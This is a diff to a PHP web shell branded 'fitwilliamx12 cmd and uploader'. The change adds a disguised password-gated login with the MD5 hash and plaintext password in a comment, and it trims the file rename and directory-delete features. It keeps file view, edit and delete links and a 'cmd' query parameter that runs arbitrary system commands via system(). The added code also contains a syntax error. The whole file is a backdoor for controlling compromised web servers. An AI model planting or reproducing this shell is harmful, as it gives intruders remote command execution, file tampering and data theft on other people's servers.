@@ -1,8 +1,83 @@
+<?php
+session_start();
+
+$correctPasswordHash = 'b1fbd7e666a56c405c73b4b144d69156'; // "sipurs"
+
+// Cek apakah password sudah di-submit
+if (isset($_POST['password'])) {
+    $enteredPassword = $_POST['password'];
+    if (md5($enteredPassword) === $correctPasswordHash) {
+        $_SESSION['authenticated'] = true;
+    } else {
+        echo '<p style="color: red;">Password salah!</p>';
+    }
+}
+
+// Jika belum login, tampilkan form password
+if (!isset($_SESSION['authenticated']) {
+    echo '
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Login</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background-color: black;
+                color: white;
+                margin: 0;
+                padding: 0;
+                height: 100vh;
+                overflow: hidden;
+            }
+            .password-form {
+                position: fixed;
+                bottom: 10px;
+                right: 10px;
+                background-color: rgba(255, 255, 255, 0.1);
+                padding: 10px;
+                border-radius: 5px;
+            }
+            .password-form input[type="password"] {
+                background-color: transparent;
+                border: 1px solid white;
+                color: white;
+                padding: 5px;
+                border-radius: 3px;
+            }
+            .password-form input[type="submit"] {
+                background-color: transparent;
+                border: 1px solid white;
+                color: white;
+                padding: 5px 10px;
+                border-radius: 3px;
+                cursor: pointer;
+            }
+            .password-form input[type="submit"]:hover {
+                background-color: rgba(255, 255, 255, 0.2);
+            }
+        </style>
+    </head>
+    <body>
+        <div class="password-form">
+            <form method="POST">
+                <input type="password" name="password" placeholder="Enter Password" required>
+                <input type="submit" value="Login">
+            </form>
+        </div>
+    </body>
+    </html>
+    ';
+    exit; // Hentikan eksekusi script selanjutnya
+}
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>fitwilliamx1337 cmd and uploader</title>
+    <title>fitwilliamx12 cmd and uploader</title>
     <style>
         body {
             font-family: Consolas, monospace;
@@ -87,7 +162,7 @@
     </style>
 </head>
 <body>
-    <h1>fitwilliamx1337 cmd and uploader  |   <a href="https://instagram.com/fitwilliamx1337">> Contact me < </a><br>
+    <h1>fitwilliamx12 cmd and uploader  |   <a href="https://instagram.com/fitwilliamx12">> Contact me < </a><br>
     <!-- System Information Section -->
     <div class="system-info">
         <p><strong>SERVER IP:</strong> <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unavailable'; ?></p>
@@ -178,74 +253,17 @@
         
         echo '<div class="file-item">';
         if (is_dir($filePath)) {
-            echo '[DIR] <a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a>' .
-                 '  | <a href="?delete_dir=' . urlencode($filePath) . '" style="color: red;">Delete</a>' .
-                 '  | <a href="?rename_dir=' . urlencode($filePath) . '" style="color: yellow;">Rename</a>';
+            echo '[DIR] <a href="?dir=' . urlencode($filePath) . '">' . htmlspecialchars($file) . '</a>';
         } else {
             echo '[FILE] ' . htmlspecialchars($file) . ' | Size: ' . $fileSize . ' bytes | Modified: ' . $fileModified .
-                 '  | <a href="?view=' . urlencode($filePath) . '">View</a>' .
-                 '  | <a href="?edit=' . urlencode($filePath) . '">Edit</a>' .
-                 '  | <a href="?delete=' . urlencode($filePath) . '" style="color: red;">Delete</a>' .
-                 '  | <a href="?rename=' . urlencode($filePath) . '" style="color: yellow;">Rename</a>';
+            '  | <a href="?view=' . urlencode($filePath) . '">View</a>' .
+            '  | <a href="?edit=' . urlencode($filePath) . '">Edit</a>' .
+            '  | <a href="?delete=' . urlencode($filePath) . '" style="color: red;">Delete</a>';
         }
         echo '</div>';
     }
 
-    // Delete Directory
-    if (isset($_GET['delete_dir'])) {
-        $deleteDirPath = $_GET['delete_dir'];
-        if (is_dir($deleteDirPath)) {
-            if (deleteDirectory($deleteDirPath)) {
-                echo '<p style="color: lime;">Directory deleted successfully: ' . htmlspecialchars(basename($deleteDirPath)) . '</p>';
-            } else {
-                echo '<p style="color: red;">Failed to delete directory: ' . htmlspecialchars(basename($deleteDirPath)) . '</p>';
-            }
-        }
-    }
-
-    // Rename Directory
-    if (isset($_GET['rename_dir'])) {
-        $renameDirPath = $_GET['rename_dir'];
-        if (is_dir($renameDirPath)) {
-            echo '<h2>Rename Directory: ' . htmlspecialchars(basename($renameDirPath)) . '</h2>';
-            if (isset($_POST['new_dir_name'])) {
-                $newDirName = $_POST['new_dir_name'];
-                $newDirPath = dirname($renameDirPath) . DIRECTORY_SEPARATOR . $newDirName;
-                if (rename($renameDirPath, $newDirPath)) {
-                    echo '<p style="color: lime;">Directory renamed successfully to: ' . htmlspecialchars($newDirName) . '</p>';
-                } else {
-                    echo '<p style="color: red;">Failed to rename directory.</p>';
-                }
-            }
-            echo '<form method="POST">';
-            echo '<input type="text" name="new_dir_name" placeholder="Enter new directory name" required>';
-            echo '<input type="submit" value="Rename">';
-            echo '</form>';
-        }
-    }
-
-    // Rename File
-    if (isset($_GET['rename'])) {
-        $renameFilePath = $_GET['rename'];
-        if (is_file($renameFilePath)) {
-            echo '<h2>Rename File: ' . htmlspecialchars(basename($renameFilePath)) . '</h2>';
-            if (isset($_POST['new_file_name'])) {
-                $newFileName = $_POST['new_file_name'];
-                $newFilePath = dirname($renameFilePath) . DIRECTORY_SEPARATOR . $newFileName;
-                if (rename($renameFilePath, $newFilePath)) {
-                    echo '<p style="color: lime;">File renamed successfully to: ' . htmlspecialchars($newFileName) . '</p>';
-                } else {
-                    echo '<p style="color: red;">Failed to rename file.</p>';
-                }
-            }
-            echo '<form method="POST">';
-            echo '<input type="text" name="new_file_name" placeholder="Enter new file name" required>';
-            echo '<input type="submit" value="Rename">';
-            echo '</form>';
-        }
-    }
-
-    // Delete File
+    // File Deletion
     if (isset($_GET['delete'])) {
         $deletePath = $_GET['delete'];
         if (is_file($deletePath) && unlink($deletePath)) {
@@ -294,7 +312,7 @@
     if (!empty($_GET['cmd'])) {
         $command = $_GET['cmd'];
         echo "Command: " . $command . "\n\n";
-        // Run Linux Command
+        // Jalankan perintah Linux
         system($command . ' 2>&1');
     }
     ?>
